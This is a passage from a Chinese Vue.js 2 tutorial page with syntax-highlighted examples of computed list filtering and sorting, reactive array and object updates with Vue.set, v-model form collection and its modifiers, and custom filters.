&#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">computed</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">filPerons</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> arr = <span class="variable language_">this</span>.<span class="property">persons</span>.<span class="title function_">filter</span>(<span class="function">(<span class="params">p</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> p.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="variable language_">this</span>.<span class="property">keyWord</span>) !== -<span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//判断一下是否需要排序</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">sortType</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        arr.<span class="title function_">sort</span>(<span class="function">(<span class="params">p1,p2</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">sortType</span> === <span class="number">1</span> ? p2.<span class="property">age</span>-p1.<span class="property">age</span> : p1.<span class="property">age</span>-p2.<span class="property">age</span></span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> arr</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// 3、更新</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">persons</span>:[</span></span><br><span class="line"><span class="language-javascript">      &#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马冬梅&#x27;</span>,<span class="attr">age</span>:<span class="number">30</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">      &#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周冬雨&#x27;</span>,<span class="attr">age</span>:<span class="number">31</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">      &#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周杰伦&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">      &#123;<span class="attr">id</span>:<span class="string">&#x27;004&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;温兆伦&#x27;</span>,<span class="attr">age</span>:<span class="number">19</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span></span><br><span class="line"><span class="language-javascript">    ]</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">updateMei</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// this.persons[0].name = &#x27;马老师&#x27; //奏效</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// this.persons[0].age = 50 //奏效</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// this.persons[0].sex = &#x27;男&#x27; //奏效</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// this.persons[0] = &#123;id:&#x27;001&#x27;,name:&#x27;马老师&#x27;,age:50,sex:&#x27;男&#x27;&#125; //不奏效</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">persons</span>.<span class="title function_">splice</span>(<span class="number">0</span>,<span class="number">1</span>,&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马老师&#x27;</span>,<span class="attr">age</span>:<span class="number">50</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Vue监测数据改变的原理"><a href="#Vue监测数据改变的原理" class="headerlink" title="Vue监测数据改变的原理"></a>Vue监测数据改变的原理</h3><ul><li>vue会监视data中所有层次的数据。</li><li>如何监测对象中的数据？<ul><li>通过setter实现监视，且要在new Vue时就传入要监测的数据。<ul><li>(1).对象中后追加的属性，Vue默认不做响应式处理</li><li>(2).如需给后添加的属性做响应式，请使用如下API：<ul><li>Vue.set(target，propertyName/index，value) 或 </li><li>vm.$set(target，propertyName/index，value)</li></ul></li></ul></li></ul></li><li>如何监测数组中的数据？<ul><li>通过包裹数组更新元素的方法实现，本质就是做了两件事：<ul><li>(1).调用原生对应的方法对数组进行更新。</li><li>(2).重新解析模板，进而更新页面。</li></ul></li></ul></li><li>在Vue修改数组中的某个元素一定要用如下方法：<ul><li>1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()</li><li>2.Vue.set() 或 vm.$set()<br><code>特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！</code><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>学生信息<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;student.age++&quot;</span>&gt;</span>年龄+1岁<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addSex&quot;</span>&gt;</span>添加性别属性，默认值：男<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;student.sex = &#x27;未知&#x27; &quot;</span>&gt;</span>修改性别<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addFriend&quot;</span>&gt;</span>在列表首位添加一个朋友<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;updateFirstFriendName&quot;</span>&gt;</span>修改第一个朋友的名字为：张三<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addHobby&quot;</span>&gt;</span>添加一个爱好<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;updateHobby&quot;</span>&gt;</span>修改第一个爱好为：开车<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;removeSmoke&quot;</span>&gt;</span>过滤掉爱好中的抽烟<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>姓名：&#123;&#123;student.name&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>年龄：&#123;&#123;student.age&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span> <span class="attr">v-if</span>=<span class="string">&quot;student.sex&quot;</span>&gt;</span>性别：&#123;&#123;student.sex&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>爱好：<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(h,index) in student.hobby&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">        &#123;&#123;h&#125;&#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>朋友们：<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(f,index) in student.friends&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">        &#123;&#123;f.name&#125;&#125;--&#123;&#123;f.age&#125;&#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">student</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">name</span>:<span class="string">&#x27;tom&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">age</span>:<span class="number">18</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">hobby</span>:[<span class="string">&#x27;抽烟&#x27;</span>,<span class="string">&#x27;喝酒&#x27;</span>,<span class="string">&#x27;烫头&#x27;</span>],</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">friends</span>:[</span></span><br><span class="line"><span class="language-javascript">        &#123;<span class="attr">name</span>:<span class="string">&#x27;jerry&#x27;</span>,<span class="attr">age</span>:<span class="number">35</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">        &#123;<span class="attr">name</span>:<span class="string">&#x27;tony&#x27;</span>,<span class="attr">age</span>:<span class="number">36</span>&#125;</span></span><br><span class="line"><span class="language-javascript">      ]</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">addSex</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// Vue.set(this.student,&#x27;sex&#x27;,&#x27;男&#x27;)</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.$set(<span class="variable language_">this</span>.<span class="property">student</span>,<span class="string">&#x27;sex&#x27;</span>,<span class="string">&#x27;男&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">addFriend</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">student</span>.<span class="property">friends</span>.<span class="title function_">unshift</span>(&#123;<span class="attr">name</span>:<span class="string">&#x27;jack&#x27;</span>,<span class="attr">age</span>:<span class="number">70</span>&#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">updateFirstFriendName</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">student</span>.<span class="property">friends</span>[<span class="number">0</span>].<span class="property">name</span> = <span class="string">&#x27;张三&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">addHobby</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">student</span>.<span class="property">hobby</span>.<span class="title function_">push</span>(<span class="string">&#x27;学习&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">updateHobby</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// this.student.hobby.splice(0,1,&#x27;开车&#x27;)</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// Vue.set(this.student.hobby,0,&#x27;开车&#x27;)</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.$set(<span class="variable language_">this</span>.<span class="property">student</span>.<span class="property">hobby</span>,<span class="number">0</span>,<span class="string">&#x27;开车&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">removeSmoke</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">student</span>.<span class="property">hobby</span> = <span class="variable language_">this</span>.<span class="property">student</span>.<span class="property">hobby</span>.<span class="title function_">filter</span>(<span class="function">(<span class="params">h</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> h !== <span class="string">&#x27;抽烟&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="收集表单数据"><a href="#收集表单数据" class="headerlink" title="收集表单数据"></a>收集表单数据</h2><ul><li>若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。</li><li>若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。</li><li>若：<input type="checkbox"/><ul><li>1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）</li><li>2.配置input的value属性:<ul><li>(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）</li><li>(2)v-model的初始值是数组，那么收集的的就是value组成的数组</li></ul></li></ul></li><li>备注：v-model的三个修饰符：<ul><li>lazy：失去焦点再收集数据</li><li>number：输入字符串转为有效的数字</li><li>trim：输入首尾空格过滤<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> @<span class="attr">submit.prevent</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span><br><span class="line">    账号：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model.trim</span>=<span class="string">&quot;userInfo.account&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;userInfo.password&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    年龄：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">v-model.number</span>=<span class="string">&quot;userInfo.age&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    性别：</span><br><span class="line">    男<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;userInfo.sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;male&quot;</span>&gt;</span></span><br><span class="line">    女<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;userInfo.sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;female&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    爱好：</span><br><span class="line">    学习<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;userInfo.hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;study&quot;</span>&gt;</span></span><br><span class="line">    打游戏<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;userInfo.hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;game&quot;</span>&gt;</span></span><br><span class="line">    吃饭<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;userInfo.hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;eat&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    所属校区</span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">v-model</span>=<span class="string">&quot;userInfo.city&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>请选择校区<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;beijing&quot;</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;shanghai&quot;</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;shenzhen&quot;</span>&gt;</span>深圳<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;wuhan&quot;</span>&gt;</span>武汉<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    其他信息：</span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">v-model.lazy</span>=<span class="string">&quot;userInfo.other&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;userInfo.agree&quot;</span>&gt;</span>阅读并接受<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.atguigu.com&quot;</span>&gt;</span>《用户协议》<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">userInfo</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">account</span>:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">password</span>:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">age</span>:<span class="number">18</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">sex</span>:<span class="string">&#x27;female&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">hobby</span>:[],</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">city</span>:<span class="string">&#x27;beijing&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">other</span>:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">agree</span>:<span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">demo</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">this</span>.<span class="property">userInfo</span>))</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><ul><li>定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。</li><li>语法：<ul><li>1.注册过滤器：<code>Vue.filter(name,callback)</code> 或 <code>new Vue&#123;filters:&#123;&#125;&#125;</code></li><li>2.使用过滤器：<code>{{xxx | 过滤器名}}</code> 或  <code>v-bind:属性 = &quot;xxx | 过滤器名&quot;</code></li></ul></li><li>备注：<ul><li>1.过滤器也可以接收额外参数、多个过滤器也可以串联</li><li>2.并没有改变原本的数据, 是产生新的对应的数据<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>显示格式化后的时间<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 计算属性实现 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在是：&#123;&#123;fmtTime&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- methods实现 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在是：&#123;&#123;getFmtTime()&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 过滤器实现 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在是：&#123;&#123;time | timeFormater&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 过滤器实现（传参） --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在是：&#123;&#123;time | timeFormater(&#x27;YYYY_MM_DD&#x27;) | mySlice&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span> <span class="attr">:x</span>=<span class="string">&quot;msg | mySlice&quot;</span>&gt;</span>尚硅谷<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root2&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;msg | mySlice&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//全局过滤器</span></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Vue</span>.<span class="title function_">filter</span>(<span class="string">&#x27;mySlice&#x27;</span>,<span class="keyword">function</span>(<span class="params">value</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> value.<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">4</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">time</span>:<span class="number">1621561377603</span>, <span class="comment">//时间戳</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">msg</span>:<span class="string">&#x27;你好，尚硅谷&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">computed</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">fmtTime</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> <span class="title function_">dayjs</span>(<span class="variable language_">this</span>.<span class="property">time</span>).<span class="title 